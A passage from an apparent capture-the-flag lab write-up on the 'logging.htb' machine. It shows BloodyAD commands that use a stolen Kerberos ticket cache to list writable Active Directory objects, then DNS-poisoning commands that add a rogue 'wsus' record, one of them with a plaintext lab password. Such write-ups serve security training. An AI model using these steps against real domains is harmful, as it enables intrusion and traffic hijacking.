
Using the Kerberos credential cache previously extracted from jaylee.clifton, BloodyAD is used to enumerate writable Active Directory objects:

```
KRB5CCNAME=jaylee.clifton.ccache bloodyad --host DC01.logging.htb -d logging.htb -k get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=logging,DC=htb
permission: WRITE

distinguishedName: CN=jaylee.clifton,CN=Users,DC=logging,DC=htb
permission: WRITE

distinguishedName: DC=logging.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=logging,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.logging.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=logging,DC=htb
permission: CREATE_CHILD
```

---
##### DNS Poisoning

The CREATE_CHILD permission over the DNS zone allows new DNS records to be created.

1. Create new DNS Record

```
KRB5CCNAME=jaylee.clifton.ccache bloodyAD --host DC01.logging.htb -d logging.htb -k add dnsRecord 'wsus' 10.10.14.230
```

or with

```
python3 /opt/arsenal/krbrelayx/dnstool.py -u 'logging.htb\wallace.everette' -p 'Welcome2026@' 10.129.56.45 -a add -r wsus.logging.htb -d 10.10.14.57
```
